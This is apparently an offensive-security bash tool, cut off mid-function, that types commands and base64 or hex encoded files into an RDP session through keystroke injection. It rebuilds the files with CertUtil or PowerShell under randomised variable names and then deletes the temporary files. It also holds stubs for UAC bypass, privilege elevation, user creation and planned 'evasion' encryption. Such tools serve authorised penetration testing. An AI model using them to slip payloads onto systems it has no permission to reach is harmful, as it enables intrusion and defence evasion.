#!/bin/bash

function print_status() {
    local status="${1}"
    local message="${2}"

    # Blue for information
    # Bold Blue for progress
    # Bold Green for completed
    # Bold Yellow for warning
    # Bold Red for error
    # * default to white
    case "${status}" in
        information) color="\033[34m[INFO]\033[0m" ;;
        progress) color="\033[1;34m[PROG]\033[0m" ;;
        completed) color="\033[1;32m[DONE]\033[0m" ;;
        warning) color="\033[1;33m[WARN]\033[0m" ;;
        error) color="\033[1;31m[ERROR]\033[0m" ;;
        *) color="\033[0m" ;;
    esac

    echo -e "${color} ${message}"
}

function check_dependencies() {
    local programs=("remmina")
    local missing_dependencies=()

    if [[ "${XDG_SESSION_TYPE}" == "x11" ]]
    then
        programs+=("xdotool")
        programs+=("xfreerdp")
    elif [[ "${XDG_SESSION_TYPE}" == "wayland" ]]
    then
        programs+=("dotool")
        programs+=("kdotool")
        programs+=("wlfreerdp")
    fi

    for program in "${programs[@]}"
    do
        if [[ -z $(which "${program}") ]]
        then
            missing_dependencies+=("${program}")
        fi
    done

    if [[ ${#missing_dependencies[@]} -ne 0 ]]
    then
        print_status "warning" "Required dependencies: ${missing_dependencies[@]}"
        print_status "information" "Terminating program..."
        exit 1
    fi
}

function get_window_name() {
    if [[ "${XDG_SESSION_TYPE}" == "x11" ]]
    then
        xdotool search --name "${WINDOWNAME}" getwindowname
    elif [[ "${XDG_SESSION_TYPE}" == "wayland" ]]
    then
        kdotool search --name "${WINDOWNAME}" getwindowname
    fi

    return ${?}
}

function keyboard() {
    local input="${1}"
    local key="${2}"

	if [[ "${XDG_SESSION_TYPE}" == "x11" ]]
	then
        case "${key}" in
            "keystrokes")
                xdotool search --name "${WINDOWNAME}" windowactivate type "${input}"
                ;;
            "escape_keystrokes")
                xdotool search --name "${WINDOWNAME}" windowactivate type -- "${input}"
                ;;
            "custom_keystroke")
                xdotool search --name "${WINDOWNAME}" windowactivate key "${input}"
                ;;
        esac
	elif [[ "${XDG_SESSION_TYPE}" == "wayland" ]]
	then
        case "${key}" in
            "keystrokes")
                kdotool search --name "${WINDOWNAME}" windowactivate && { echo type "${input}" } | dotool
                ;;
            "escape_keystrokes")
                kdotool search --name "${WINDOWNAME}" windowactivate && { echo type "${input}" } | dotool
                ;;
            "custom_keystroke")
                kdotool search --name "${WINDOWNAME}" windowactivate && { echo key "${input}" } | dotool
                ;;
        esac
	fi
}

function random_string() {
    local -a characters=({a..z} {A..Z} {0..9})
    local length=$(( RANDOM % 13 + 8 ))  # A length of characters between 8 and 20
    local string=""

    for (( i=0; i<length; i++ ))
    do
        local random_index=$(( RANDOM % ${#characters[@]} ))
        string+=${characters[$random_index]}
    done

    echo "${string}"
}

function count_lines() {
    local file="${1}"
    local counter=0

    while read -r line
    do
        (( counter++ ))
    done < "${file}"

    echo "${counter}"
}

# There is a limitation with this implementation.
# However, it is ideal for uploading files with a specific path.

function directory_name() {
    local filepath="${1}"
    local directory_name

    # Determine the type of slashes used in the path
    if [[ "${filepath}" == *\\* ]]
    then
        # Handle paths with backslashes (Windows style)
        directory_name="${filepath%\\*}"

        # Special case: if the result is empty, it means the path was something like "C:\file"
        if [[ -z "${directory_name}" || "${directory_name}" == "${filepath}" ]]
        then
            echo "."
            return
        fi

        echo "${directory_name}"
    else
        # Handle paths with forward slashes (Unix style)
        if [[ "${filepath}" != */* ]]
        then
            echo "."
            return
        fi

        directory_name="${filepath%/*}"

        # Special case: if the result is empty, it means the path was something like "/file"
        if [[ -z "${directory_name}" || "${directory_name}" == "${filepath}" ]]
        then
            echo "/"
            return
        fi

        echo "${directory_name}"
    fi
}

# Retrieving the filename and strips the directory while it
# keeps the suffix
function base_name() {
    local path="${1}"
    local filename="${path##*/}"

    echo "${filename}"
}

function terminate_program() {
    print_status "warning" "SIGINT response detected!"
    print_status "information" "Terminating program..."
    exit 1
}

trap terminate_program SIGINT

function automate() {
    local file="${1}"
    local lines=$(count_lines "${file}")

    print_status "progress" "Executing commands..."

    # If there are zero new lines just read the remaining file's contents.
    if [[ ${lines} -eq 0 ]]
    then
        read contents < "${file}"
        keyboard "${contents}" "escape_keystrokes"
        keyboard "Return" "custom_keystroke"
    else
        while read -r line
        do
            keyboard "${line}" "escape_keystrokes"
            keyboard "Return" "custom_keystroke"
        done < "${file}"
    fi
    print_status "completed" "Task completed!"
}

function dialogue_box() {
    local commands="${1}"

    if [[ "${PLATFORM}" != "windows" ]]
    then
        print_status "error" "This execution method is only exclusive for windows!"
        print_status "information" "Terminating program..."
        exit 1
    fi

    print_status "information" "Checking one of the lines reaches 260 character limit"
    if [[ ${#commands} -ge 260 ]]
    then
        print_status "error" "Character Limit reached! Terminating program."
        exit 1
    fi

    print_status "progress" "Executing commands..."
    keyboard "Super+r" "custom_keystroke"
    keyboard "${commands}" "escape_keystrokes"
    keyboard "Return" "custom_keystroke"
    print_status "completed" "Task completed!"
}

function execute() {
    local commands="${1}"
    local method="${2}"

    case "${method}" in
        none)
            print_status "progress" "Executing commands..."
            keyboard "${commands}" "escape_keystrokes"
            keyboard "Return" "custom_keystroke"
            print_status "completed" "Task completed!"
            ;;
        dialogbox)
            dialogue_box "${commands}"
            ;;
        *)
            print_status "error" "Invalid Execution Type!" >&2
            print_status "information" "Available methods are: none, and dialogbox"
            print_status "information" "Terminating program..."
            exit 1
            ;;
    esac
}

function base64_encoding_scheme() {
    local input="${1}"
    local output_file="${2}"
    local mode="${3}"
    local file_character_set=$(file --mime-encoding "${input}")
    local file_type=${file_character_set##*: }
    local data
    local chunks=100
    local random_variable_one=$(random_string)
    local random_variable_two=$(random_string)

    # TODO: Implement encryption method through base64 with -e,--evasion flag
    # $ rks -i file -o output -m pwshb64 -e compression
    # $ iconv -t UTF-16LE file.txt | gzip | basenc -w 0 --base64
    # $ gzip -c file.exe | basenc -w 0 --base64

    # $ rks -i file -o output -m pwshb64 -e aes256
    # $ iconv -t UTF-16LE file.txt | gzip | openssl enc -a -e -A
    # $ gzip -c file.exe | openssl enc -a -e -A

    # Check if input is passed as file
    if [[ -f "${input}" && ("${PLATFORM}" == "windows" || "${PLATFORM}" == "linux") && "${mode}" == "powershell" ]]
    then
        if [[ "${file_type}" == "binary" ]]
        then
            data=$(basenc -w 0 --base64 "${input}")
        else
            data=$(iconv -f ASCII -t UTF-16LE "${input}" | basenc -w 0 --base64)
        fi

        print_status "progress" "Transferring file..."

        for (( i=0; i<${#data}; i+=chunks ))
        do
            if [[ ${i} -eq 0 ]]
            then
                keyboard "\$${random_variable_one} = \"${data:i:chunks}\"" "keystrokes"
                keyboard "Return" "custom_keystroke"
            else
                keyboard "\$${random_variable_one} += \"${data:i:chunks}\"" "keystrokes"
                keyboard "Return" "custom_keystroke"
            fi
        done

        keyboard "[byte[]]\$${random_variable_two} = [Convert]::FromBase64String(\$${random_variable_one})" "keystrokes"
        keyboard "Return" "custom_keystroke"
        keyboard "[IO.File]::WriteAllBytes(\"${output_file}\", \$${random_variable_two})" "keystrokes"
        keyboard "Return" "custom_keystroke"

        print_status "completed" "File transferred!"
    elif [[ "${PLATFORM}" == "linux" && "${mode}" == "console" ]]
    then
        data=$(basenc -w 0 --base64 "${input}")

        print_status "progress" "Transferring file..."

        for (( i=0; i<${#data}; i+=chunks ))
        do
            if [[ ${i} -eq 0 ]]
            then
                keyboard "${random_variable_one}=\"${data:i:chunks}\"" "keystrokes"
                keyboard "Return" "custom_keystroke"
            else
                keyboard "${random_variable_one}+=\"${data:i:chunks}\"" "keystrokes"
                keyboard "Return" "custom_keystroke"
            fi
        done

        keyboard "base64 -d <<< \$${random_variable_one} > \"${output_file}\"" "keystrokes"
        keyboard "Return" "custom_keystroke"
        print_status "completed" "File transferred!"
    fi
}

function base32_radix() {
    local input="${1}"
    local output_file="${2}"
    local mode="${3}"
    local data
    local chunks=100
    local random_variable=$(random_string)

    if [[ "${PLATFORM}" != "linux" ]]
    then
        print_status "error" "This execution method is only exclusive for linux!"
        print_status "information" "Terminating program..."
        exit 1
    fi
    # TODO: Implement this feature
    # For linux (two types)
    data=$(basenc -w 0 --base32 "${input}")
    data=$(basenc -w 0 --base32hex "${input}")
}

# Using hexadecimal to encode files
function base16_radix() {
    local input="${1}"
    local output_file="${2}"
    local mode="${3}"
    local data=$(basenc -w 0 --base16 "${input}")
    local chunks=100
    local random_variable=$(random_string)
    local random_temp_file=$(random_string)
    local directory_path=$(directory_name "${output_file}")
    local temp

    if [[ "${PLATFORM}" != "windows" && "${PLATFORM}" != "linux" ]]
    then
        print_status "error" "Only both linux and windows are supported for this method!"
        print_status "information" "Terminating program..."
        exit 1
    fi

    if [[ -f "${input}" ]]
    then
    	if [[ "${mode}" == "powershell" ]]
    	then
            print_status "progress" "Transferring file..."

            for (( i=0; i<${#data}; i+=chunks ))
            do
                if [[ ${i} -eq 0 ]]
                then
                    keyboard "\$${random_variable} = \"${data:i:chunks}\"" "keystrokes"
                    keyboard "Return" "custom_keystroke"
                else
                    keyboard "\$${random_variable} += \"${data:i:chunks}\"" "keystrokes"
                    keyboard "Return" "custom_keystroke"
                fi
            done

            keyboard "[IO.File]::WriteAllBytes(\"${output_file}\", (\$${random_variable} -split '(.{2})' | Where-Object { \$_ -ne '' } | ForEach-Object { [Convert]::ToByte(\$_, 16) }))" "keystrokes"
            keyboard "Return" "custom_keystroke"
        elif [[ "${mode}" == "certutil" ]]
        then
            if [[ "${PLATFORM}" != "windows" ]]
            then
                print_status "error" "This method is only exclusive for windows!"
                print_status "information" "Use 'nixhex' as a method instead."
                print_status "information" "Terminating program..."
                exit 1
            fi

            # TODO: Make an if statement of limited characters or lines using batch variable via command prompt
            # The maximum length of the string that you can use at the command prompt is 8191 characters.
            # https://learn.microsoft.com/en-us/troubleshoot/windows-client/shell-experience/command-line-string-limitation
            print_status "information" "Checking 8191 character limit..."
            if [[ ${#data} -gt 8191 ]]
            then
                print_status "error" "Character limit!"
            fi

            print_status "progress" "Transferring file..."

            # Appends the hexadecimal data in a batch file
            for (( i=0; i<${#data}; i+=chunks ))
            do
                if [[ ${i} -eq 0 ]]
                then
                    keyboard "set ${random_variable}=${data:i:chunks}" "keystrokes"
                    keyboard "Return" "custom_keystroke"
                else
                    keyboard "set ${random_variable}=%${random_var}%${data:i:chunks}" "keystrokes"
                    keyboard "Return" "custom_keystroke"
                fi
            done

            keyboard "echo %${random_var}% > \"${directory_path}\\${random_temp_file}.hex\"" "keystrokes"
            keyboard "Return" "custom_keystroke"
            keyboard "CertUtil.exe -f -decodehex \"${directory_path}\\${random_temp_file}.hex\" \"${output_file}\" 12" "keystrokes"
            keyboard "Return" "custom_keystroke"
            keyboard "del /f \"${directory_path}\\${random_temp_file}.hex\"" "keystrokes"
            keyboard "Return" "custom_keystroke"
    	elif [[ "${mode}" == "console" ]]
    	then
            print_status "progress" "Transferring file..."

            # Split a pair of characters and make it into a hexadecimal format.
            for (( i=0; i<${#data}; i+=2))
            do
                temp+="\\x${data:i:2}"
            done

            for (( i=0; i<${#temp}; i+=chunks ))
            do
                if [[ ${i} -eq 0 ]]
                then
                    keyboard "${random_variable}=\"${temp:i:chunks}\"" "keystrokes"
                    keyboard "Return" "custom_keystroke"
                else
                    keyboard "${random_variable}+=\"${temp:i:chunks}\"" "keystrokes"
                    keyboard "Return" "custom_keystroke"
                fi
            done

            # Interpret the backslash to output into a file.
            keyboard "echo -en \$${random_variable} > \"${output_file}\"" "keystrokes"
            keyboard "Return" "custom_keystroke"
    	fi
        print_status "completed" "File transferred!"
    fi
}

# Using binary digits of 1 and 0
# to encode files with each 8 bits of size
function base2_radix() {
    local input="${1}"
    local output_file="${2}"
    local mode="${3}"
    local data=$(basenc -w 0 --base2msbf "${input}")
    local chunks=100
    local random_variable=$(random_string)
    local temp

    if [[ "${PLATFORM}" != "windows" && "${PLATFORM}" != "linux" ]]
    then
        print_status "error" "Only both linux and windows are supported for this method!"
        print_status "information" "Terminating program..."
        exit 1
    fi

    # TODO: Implement this feature for both linux and powershell cmdlet
    echo "not yet implemented"
    if [[ -f "${input}" ]]
    then
    	if [[ "${mode}" == "powershell" ]]
    	then
            print_status "progress" "Transferring file..."

            for (( i=0; i<${#data}; i+=chunks ))
            do
                if [[ ${i} -eq 0 ]]
                then
                    keyboard "\$${random_variable} = \"${data:i:chunks}\"" "keystrokes"
                    keyboard "Return" "custom_keystroke"
                else
                    keyboard "\$${random_variable} += \"${data:i:chunks}\"" "keystrokes"
                    keyboard "Return" "custom_keystroke"
                fi
            done

            keyboard "[IO.File]::WriteAllBytes(\"${output_file}\", (\$${random_variable} -split '(.{2})' | Where-Object { \$_ -ne '' } | ForEach-Object { [Convert]::ToByte(\$_, 16) }))" "keystrokes"
            keyboard "Return" "custom_keystroke"
    	elif [[ "${mode}" == "console" ]]
    	then
            print_status "progress" "Transferring file..."

            # Split a pair of characters and make it into a hexadecimal format.
            for (( i=0; i<${#data}; i+=2))
            do
                temp+="\\x${data:i:2}"
            done

            for (( i=0; i<${#temp}; i+=chunks ))
            do
                if [[ ${i} -eq 0 ]]
                then
                    keyboard "${random_variable}=\"${temp:i:chunks}\"" "keystrokes"
                    keyboard "Return" "custom_keystroke"
                else
                    keyboard "${random_variable}+=\"${temp:i:chunks}\"" "keystrokes"
                    keyboard "Return" "custom_keystroke"
                fi
            done

            # Interpret the backslash to output into a file.
            keyboard "echo -en \$${random_variable} > \"${output_file}\"" "keystrokes"
            keyboard "Return" "custom_keystroke"
    	fi
        print_status "completed" "File transferred!"
    fi
}

# Using decimals to encode files
function base10_radix() {
    local input="${1}"
    local output_file="${2}"
    local mode="${3}"
    local data
    local chunks=100
    local random_variable=$(random_string)
    local temp

    # TODO: Implement this feature for both linux and powershell cmdlet
    # $ printf
    echo "not yet implemented"
    if [[ -f "${input}" ]]
    then
    	if [[ "${mode}" == "powershell" ]]
    	then
            print_status "progress" "Transferring file..."

        for (( i=0; i<${#data}; i+=chunks ))
        do
            if [[ ${i} -eq 0 ]]
            then
                keyboard "\$${random_variable} = \"${data:i:chunks}\"" "keystrokes"
                keyboard "Return" "custom_keystroke"
            else
                keyboard "\$${random_variable} += \"${data:i:chunks}\"" "keystrokes"
                keyboard "Return" "custom_keystroke"
            fi
        done
            # TODO: Change this from binary to decimal
            keyboard "[IO.File]::WriteAllBytes(\"${output_file}\", (\$${random_variable} -split '(.{2})' | Where-Object { \$_ -ne '' } | ForEach-Object { [Convert]::ToByte(\$_, 16) }))" "keystrokes"
            keyboard "Return" "custom_keystroke"
    	elif [[ "${mode}" == "console" ]]
    	then
            print_status "progress" "Transferring file..."

            # TODO: Change this from binary to decimal
            # Split a pair of characters and make it into a hexadecimal format.
            for (( i=0; i<${#data}; i+=2))
            do
                temp+="\\x${data:i:2}"
            done

            for (( i=0; i<${#temp}; i+=chunks ))
            do
                if [[ ${i} -eq 0 ]]
                then
                    keyboard "${random_variable}=\"${temp:i:chunks}\"" "keystrokes"
                    keyboard "Return" "custom_keystroke"
                else
                    keyboard "${random_variable}+=\"${temp:i:chunks}\"" "keystrokes"
                    keyboard "Return" "custom_keystroke"
                fi
            done

            # Interpret the backslash to output into a file.
            keyboard "echo -en \$${random_variable} > \"${output_file}\"" "keystrokes"
            keyboard "Return" "custom_keystroke"
    	fi
        print_status "completed" "File transferred!"
    fi
}

# Using octals to encode files
function base8_radix() {
    local input="${1}"
    local output_file="${2}"
    local mode="${3}"
    local data
    local chunks=100
    local random_variable=$(random_string)
    local temp

    # TODO: Implement this feature for both linux and powershell cmdlet
    # $ od -A n -t o1 -v file.txt | tr -d "[:space:]"
    echo "not implemented"
    if [[ -f "${input}" ]]
    then
    	if [[ "${mode}" == "powershell" ]]
    	then
            print_status "progress" "Transferring file..."

        for (( i=0; i<${#data}; i+=chunks ))
        do
            if [[ ${i} -eq 0 ]]
            then
                keyboard "\$${random_variable} = \"${data:i:chunks}\"" "keystrokes"
                keyboard "Return" "custom_keystroke"
            else
                keyboard "\$${random_variable} += \"${data:i:chunks}\"" "keystrokes"
                keyboard "Return" "custom_keystroke"
            fi
        done

            keyboard "[IO.File]::WriteAllBytes(\"${output_file}\", (\$${random_variable} -split '(.{2})' | Where-Object { \$_ -ne '' } | ForEach-Object { [Convert]::ToByte(\$_, 16) }))" "keystrokes"
            keyboard "Return" "custom_keystroke"
    	elif [[ "${mode}" == "console" ]]
    	then
            print_status "progress" "Transferring file..."

            # Split a pair of characters and make it into a hexadecimal format.
            for (( i=0; i<${#data}; i+=2))
            do
                temp+="\\x${data:i:2}"
            done

            for (( i=0; i<${#temp}; i+=chunks ))
            do
                if [[ ${i} -eq 0 ]]
                then
                    keyboard "${random_variable}=\"${temp:i:chunks}\"" "keystrokes"
                    keyboard "Return" "custom_keystroke"
                else
                    keyboard "${random_variable}+=\"${temp:i:chunks}\"" "keystrokes"
                    keyboard "Return" "custom_keystroke"
                fi
            done

            # Interpret the backslash to output into a file.
            keyboard "echo -en \$${random_variable} > \"${output_file}\"" "keystrokes"
            keyboard "Return" "custom_keystroke"
    	fi
        print_status "completed" "File transferred!"
    fi
}

function output_variable() {
    local input="${1}"
    local output_file="${2}"
    local mode="${3}"
    local file_character_set=$(file --mime-encoding "${input}")
    local file_type=${file_character_set##*: }
    local lines=$(count_lines "${input}")
    local data
    local chunks=100
    local encoded=()
    local counter
    local random_temp_file=$(random_string)
    local directory_path=$(directory_name "${output_file}")

    if [[ "${PLATFORM}" != "windows" && "${PLATFORM}" != "linux" ]]
    then
        print_status "error" "Only windows and linux are supported for this method!"
        print_status "information" "Terminating program..."
        exit 1
    fi

    if [[ -f "${input}" ]]
    then
        if [[ "${mode}" == "text" && "${file_type}" != "binary" ]]
        then
            print_status "progress" "Checking one of the lines reaches 3477 character limit"
            while read -r line
            do
                length=${#line}
                if [[ ${length} -ge 3477 ]]
                then
                    print_status "error" "Character Limit reached!"
                    print_status "information" "Use 'outfileb64' as a method instead."
                    print_status "information" "Terminating program..."
                    exit 1
                fi
            done < "${input}"

            print_status "progress" "Transferring file..."
            keyboard "@'" "escape_keystrokes"
            keyboard "Return" "custom_keystroke"
            while read -r line
            do
                keyboard "${line}" "keystrokes"
                keyboard "Return" "custom_keystroke"
            done < "${input}"

            keyboard "'@ | Out-File ${output_file}" "escape_keystrokes"
            keyboard "Return" "custom_keystroke"
        elif [[ "${mode}" == "text" && "${file_type}" == "binary" ]]
        then
            print_status "warning" "This is a binary file! Switching to 'outfileb64' method instead..."
            powershell_outfile "${input}" "${output_file}" "${platform}" "certutil"
            exit 1
        elif [[ "${mode}" == "base64" ]]
        then
            chunks=64

            if [[ "${PLATFORM}" != "windows" ]]
            then
                print_status "error" "This method is exclusively used for windows because it relies on 'CertUtil.exe'."
                print_status "information" "Use 'nixb64' method instead."
                print_status "information" "Terminating program..."
                exit 1
            fi

            print_status "progress" "Transferring file..."
            data=$(basenc -w 0 --base64 "${input}")
            keyboard "@'" "escape_keystrokes"
            keyboard "Return" "custom_keystroke"
            keyboard "-----BEGIN CERTIFICATE-----" "escape_keystrokes"
            keyboard "Return" "custom_keystroke"

            for (( i=0; i<${#data}; i+=chunks ))
            do
                if [[ ${i} -eq 0 ]]
                then
                    keyboard "${data:i:chunks}" "keystrokes"
                    keyboard "Return" "custom_keystroke"
                else
                    keyboard "${data:i:chunks}" "keystrokes"
                    keyboard "Return" "custom_keystroke"
                fi
            done

            keyboard "-----END CERTIFICATE-----" "escape_keystrokes"
            keyboard "Return" "custom_keystroke"
            keyboard "'@ | Out-File \"${directory_path}\\${random_temp}.txt\"" "escape_keystrokes"
            keyboard "Return" "custom_keystroke"
            keyboard "CertUtil.exe -f -decode \"${directory_path}\\${random_temp_file}.txt\" ${output_file}" "keystrokes"
            keyboard "Return" "custom_keystroke"
            keyboard "Remove-Item -Force \"${directory_path}\\${random_temp_file}.txt\"" "keystrokes"
            keyboard "Return" "custom_keystroke"
        elif [[ "${mode}" == "hex" ]]
        then
            print_status "progress" "Transferring file..."
            data=$(basenc -w 0 --base16 "${input}")

            # Append the pair of hexadecimal characters in a array
            for (( i=0; i<${#data}; i+=2 ))
            do
            	encoded+=("${data:i:2}")
            done

            keyboard "@'" "escape_keystrokes"
            keyboard "Return" "custom_keystroke"

            counter=0
            for ((i=0; i<${#encoded[@]}; i++))
            do
                if [[ ${counter} -eq 7 ]]
                then
                    keyboard "${encoded[i]}" "keystrokes"
                    keyboard "space" "custom_keystroke"
                elif [[ ${counter} -eq 8 ]]
                then
                    keyboard "space" "custom_keystroke"
                    (( counter++ ))
                elif [[ ${counter} -eq 15 ]]
                then
                    keyboard "${encoded[i]}" "keystrokes"
                    keyboard "Return" "custom_keystroke"
                elif [[ ${i} -eq $((${#encoded[@]} - 1)) ]]
                then
                    keyboard "${encoded[i]}" "keystrokes"
                    keyboard "Return" "custom_keystroke"
                else
                    keyboard "${encoded[i]}" "keystrokes"
                    keyboard "space" "custom_keystroke"
                fi

                if [[ ${counter} -eq 15 ]]
                then
                    counter=0
                else
                    (( counter++ ))
                fi
            done
            keyboard "'@ | Out-File \"${directory_path}\\${random_temp_file}.hex\"" "escape_keystrokes"
            keyboard "Return" "custom_keystroke"
            keyboard "CertUtil.exe -f -decodehex \"${directory_path}\\${random_temp_file}.hex\" \"${output_file}\" 4" "keystrokes"
            keyboard "Return" "custom_keystroke"
            keyboard "Remove-Item -Force \"${directory_path}\\${random_temp_file}.hex\"" "keystrokes"
            keyboard "Return" "custom_keystroke"
        elif [[ "${mode}" == "console" ]]
        then
            # TODO: Test it.
            if [[ "${PLATFORM}" != "linux" ]]
            then
                print_status "error" "This method is exclusively used for unix because it relies on 'echo'."
                print_status "information" "Use 'outfile' method instead."
                print_status "information" "Terminating program..."
                exit 1
            fi

            print_status "progress" "Transferring file..."
            # TODO: Add this in the if statement for the first line.
            # echo "inserting lines...
            keyboard "echo \"" "escape_keystrokes"
            keyboard "Return" "custom_keystroke"

            counter=1
            while read -r line
            do
                if [[ ${counter} -ne ${lines} ]]
                then
                    keyboard "${line}" "escape_keystrokes"
                    keyboard "Return" "custom_keystroke"
                else
                    keyboard "${line}\" > ${output_file}" "escape_keystrokes"
                    keyboard "Return" "custom_keystroke"
                fi
                (( counter++ ))
            done < "${input}"

        elif [[ "${mode}" == "consoleb64" ]]
        then
            # TODO: Test it.
            chunks=64
            if [[ "${PLATFORM}" != "linux" ]]
            then
                print_status "error" "This method is exclusively used for unix because it relies on 'echo'."
                print_status "information" "Use 'outfileb64' method instead."
                print_status "information" "Terminating program..."
                exit 1
            fi

            print_status "progress" "Transferring file..."
            data=$(basenc -w 0 --base64 "${input}")
            # TODO: Add this in the if statement for the first line.
            # echo "inserting lines...
            keyboard "echo \"" "escape_keystrokes"
            keyboard "Return" "custom_keystroke"

            for (( i=0; i<${#data}; i+=chunks ))
            do
                if [[ ${i} -eq 0 ]]
                then
                    keyboard "${data:i:chunks}" "escape_keystrokes"
                    keyboard "Return" "custom_keystroke"
                else
                    keyboard "${data:i:chunks}\" > ${output_file}" "escape_keystrokes"
                    keyboard "Return" "custom_keystroke"
                fi
            done
            # TODO: Add a flag for legacy command "base64 -d -w 0"
            keyboard "basenc -w 0 -d --base64 \"${directory_path}/${random_temp_file}.txt\" > \"${output_file}\"" "escape_keystrokes"
            keyboard "Return" "custom_keystroke"
            keyboard "rm -f \"${directory_path}\\${random_temp_file}.txt\"" "escape_keystrokes"
            keyboard "Return" "custom_keystroke"
        fi
    fi

    print_status "completed" "File transferred!"
}

function copy_con() {
    local input="${1}"
    local output_file="${2}"
    local mode="${3}"
    local file_character_set=$(file --mime-encoding "${input}")
    local file_type=${file_character_set##*: }
    local lines=$(count_lines "${input}")
    local data
    local chunks
    local encoded=()
    local counter
    local random_temp_file=$(random_string)
    local directory_path=$(directory_name "${output_file}")

    if [[ "${PLATFORM}" != "windows" ]]
    then
        print_status "error" "copycon only exists on Windows operating system!"
        print_status "information" "Use 'pwshb64' method instead."
        print_status "information" "Terminating program..."
        exit 1
    fi

    if [[ -f "${input}" && "${mode}" == "text" ]]
    then
        print_status "progress" "Checking one of the lines reaches 255 character limit"
        while read -r line
        do
            if [[ ${#line} -ge 255 ]]
            then
                print_status "error" "Character Limit reached!"
                print_status "information" "Use 'cmdb64' as a method instead."
                print_status "information" "Terminating program..."
                exit 1
            fi
        done < "${input}"

        print_status "progress" "Transferring file..."
        keyboard "copy con /y ${output_file}" "keystrokes"
        keyboard "Return" "custom_keystroke"

        counter=1
        while read -r line
        do
            if [[ ${counter} -ne ${lines} ]]
            then
                keyboard "${line}" "escape_keystrokes"
                keyboard "Return" "custom_keystroke"
            else
                keyboard "${line}" "escape_keystrokes"
                keyboard "Ctrl+Z" "custom_keystroke"
                keyboard "Return" "custom_keystroke"
            fi
            (( counter++ ))
        done < "${input}"
    elif [[ "${mode}" == "base64" ]]
    then
        chunks=64

        if [[ "${file_type}" == "binary" ]]
        then
            data=$(basenc -w 0 --base64 "${input}")
        else
            data=$(iconv -f ASCII -t UTF-16LE "${input}" | basenc -w 0 --base64)
        fi

        print_status "progress" "Transferring file..."
        keyboard "copy con /y \"${directory_path}\\${random_temp_file}.txt\"" "keystrokes"
        keyboard "Return" "custom_keystroke"
        keyboard "-----BEGIN CERTIFICATE-----" "escape_keystrokes"
        keyboard "Return" "custom_keystroke"

        for (( i=0; i<${#data}; i+=chunks ))
        do
            if [[ ${i} -eq 0 ]]
            then
                keyboard "${data:i:chunks}" "keystrokes"
                keyboard "Return" "custom_keystroke"
            else
                keyboard "${data:i:chunks}" "keystrokes"
                keyboard "Return" "custom_keystroke"
            fi
        done

        keyboard "-----END CERTIFICATE-----" "keystrokes"
        keyboard "Ctrl+Z" "custom_keystroke"
        keyboard "Return" "custom_keystroke"
        keyboard "CertUtil.exe -f -decode \"${directory_path}\\${random_temp_file}.txt\" ${output_file}" "keystrokes"
        keyboard "Return" "custom_keystroke"
        keyboard "del /f \"${directory_path}\\${random_temp_file}.txt\"" "keystrokes"
        keyboard "Return" "custom_keystroke"
    elif [[ "${mode}" == "hex" ]]
    then
    	print_status "progress" "Transferring file..."
        data=$(basenc -w 0 --base16 "${input}")

        # Append the pair of hexadecimal characters in a array
        for (( i=0; i<${#data}; i+=2 ))
        do
            encoded+=("${data:i:2}")
        done

        keyboard "copy con /y \"${directory_path}\\${random_temp_file}.hex\"" "keystrokes"
        keyboard "Return" "custom_keystroke"

        counter=0
        for ((i=0; i<${#encoded[@]}; i++))
        do
            if [[ ${counter} -eq 7 ]]
            then
                keyboard "${encoded[i]}" "keystrokes"
                keyboard "space" "custom_keystroke"
            elif [[ ${counter} -eq 8 ]]
            then
                keyboard "space" "custom_keystroke"
                (( counter++ ))
            elif [[ ${counter} -eq 15 ]]
            then
                keyboard "${encoded[i]}" "keystrokes"
                keyboard "Return" "custom_keystroke"
            elif [[ ${i} -eq $((${#encoded[@]} - 1)) ]]
            then
                keyboard "${encoded[i]}" "keystrokes"
                keyboard "Ctrl+Z" "custom_keystroke"
                keyboard "Return" "custom_keystroke"
            else
               	keyboard "${encoded[i]}" "keystrokes"
               	keyboard "space" "custom_keystroke"
            fi

            if [[ ${counter} -eq 15 ]]
            then
                counter=0
            else
                (( counter++ ))
            fi
        done

        keyboard "CertUtil.exe -f -decodehex \"${directory_path}\\${random_temp_file}.hex\" \"${output_file}\" 4" "keystrokes"
        keyboard "Return" "custom_keystroke"
        keyboard "del /f \"${directory_path}\\${random_temp_file}.hex\"" "keystrokes"
        keyboard "Return" "custom_keystroke"
    fi

    print_status "completed" "File transferred!"
}

function upload() {
    local local_file="${1}"
    local remote_file="${2}"
    local method="${4}"
    local action="${5}"
    local evasion="${6}"

    # TODO: Implement action for alternatives commands, such as "compression" (gzip)
    # and evasion for implementating encryption

    # Add more upload methods Base2, Base8, Base10

    case "${method}" in
        "" | pwshb64)
            base64_encoding_scheme "${local_file}" "${remote_file}" "powershell" "${action}" "${evasion}"
            ;;
        cmdb64)
            copy_con "${local_file}" "${remote_file}" "base64"
            ;;
        nixb64)
            base64_encoding_scheme "${local_file}" "${remote_file}" "console" "${action}"
            ;;
        outfile)
            output_variable "${local_file}" "${remote_file}" "text"
            ;;
        outfileb64)
            output_variable "${local_file}" "${remote_file}" "base64"
            ;;
        echofile)
            output_variable "${local_file}" "${remote_file}" "console"
            ;;
        echofileb64)
            output_variable "${local_file}" "${remote_file}" "consoleb64"
            ;;
        copycon)
            copy_con "${local_file}" "${remote_file}" "text"
            ;;
        pwshhex)
            base16_radix "${local_file}" "${remote_file}" "powershell"
            ;;
        cmdhex)
            base16_radix "${local_file}" "${remote_file}" "certutil"
            ;;
        copyconhex)
            copy_con "${local_file}" "${remote_file}" "hex"
            ;;
        nixhex)
            base16_radix "${local_file}" "${remote_file}" "console"
            ;;
        outfilehex)
            output_variable "${local_file}" "${remote_file}" "hex"
            ;;
        *)
            print_status "error" "Invalid File Transfer Technique!" >&2
            print_status "information" "Available methods are: pwshb64, cmdb64, nixb64, outfile, outfileb64, echofile, echofileb64, copycon, pwshhex, cmdhex, copyconhex, nixhex, and outfilehex"
            print_status "information" "Terminating program..."
            exit 1
            ;;
    esac
}

function bypassuac() {
    local action="${1}"
    read -d '' description << EOF
Fill in the description of the technique
EOF

    if [[ "${PLATFORM}" != "windows" ]]
    then
        print_status "error" "This execution method is only exclusive for windows!"
        print_status "information" "Terminating program..."
        exit 1
    fi

    echo "not implemented"
}

function elevate() {
    local elevate_method="${1}"
    local elevate_action="${2}"
    # TODO: add -a, --action flag
    # -a info -p <windows | linux> -m bypassuac

    # TODO: Print out information with commands to instruct the user both commands and cmdlet
    # Add a cleanup method
    if [[ "${PLATFORM}" != "windows" ]]
    then
        print_status "error" "UAC only exists on Windows operating system!"
        print_status "information" "Terminating program..."
        exit 1
    fi

    echo "Not implemented"
}

function create_user() {
    local action="${1}"
    read -d '' windows_description << EOF
